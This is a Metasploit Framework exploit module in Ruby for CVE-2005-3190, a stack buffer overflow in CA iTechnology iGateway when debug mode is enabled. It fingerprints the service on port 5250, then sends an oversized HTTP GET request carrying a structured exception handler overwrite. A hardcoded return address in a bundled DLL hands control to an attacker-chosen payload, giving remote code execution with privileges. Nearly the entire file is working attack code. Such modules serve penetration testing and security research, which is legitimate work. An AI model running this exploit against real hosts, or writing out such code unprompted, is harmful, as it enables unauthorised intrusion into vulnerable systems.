##
# $Id: ca_igateway_debug.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'CA iTechnology iGateway Debug Mode Buffer Overflow',
			'Description'    => %q{
					This module exploits a vulnerability in the Computer Associates
				iTechnology iGateway component. When <Debug>True</Debug> is enabled
				in igateway.conf (non-default), it is possible to overwrite the stack
				and execute code remotely. This module works best with Ordinal payloads.
			},
			'Author'         => 'patrick',
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE', '2005-3190' ],
					[ 'OSVDB', '19920' ],
					[ 'URL', 'http://www.ca.com/us/securityadvisor/vulninfo/vuln.aspx?id=33485' ],
					[ 'URL', 'http://www.milw0rm.com/exploits/1243' ],
					[ 'BID', '15025' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00\x0a\x0d\x20",
					'StackAdjustment' => -3500,
					'Compat'   =>
					{
						'ConnectionType' => '+ws2ord',
					},
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'iGateway 3.0.40621.0', { 'Ret' => 0x120bd9c4 } ], # p/p/r xerces-c_2_1_0.dll
				],
			'Privileged'     => true,
			'DisclosureDate' => 'Oct 06 2005',
			'DefaultTarget'  => 0))

		register_options(
			[
				Opt::RPORT(5250),
			], self.class)
	end

	def check
		connect
		sock.put("HEAD / HTTP/1.0\r\n\r\n\r\n")
		banner = sock.get(-1,3)

		if (banner =~ /GET and POST methods are the only methods supported at this time/) # Unique?
			return Exploit::CheckCode::Detected
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		connect

		seh = generate_seh_payload(target.ret)
		buffer = Rex::Text.rand_text_alphanumeric(5000)
		buffer[1082, seh.length] = seh
		sploit = "GET /" + buffer + " HTTP/1.0"

		sock.put(sploit + "\r\n\r\n\r\n")

		disconnect
		handler
	end
end
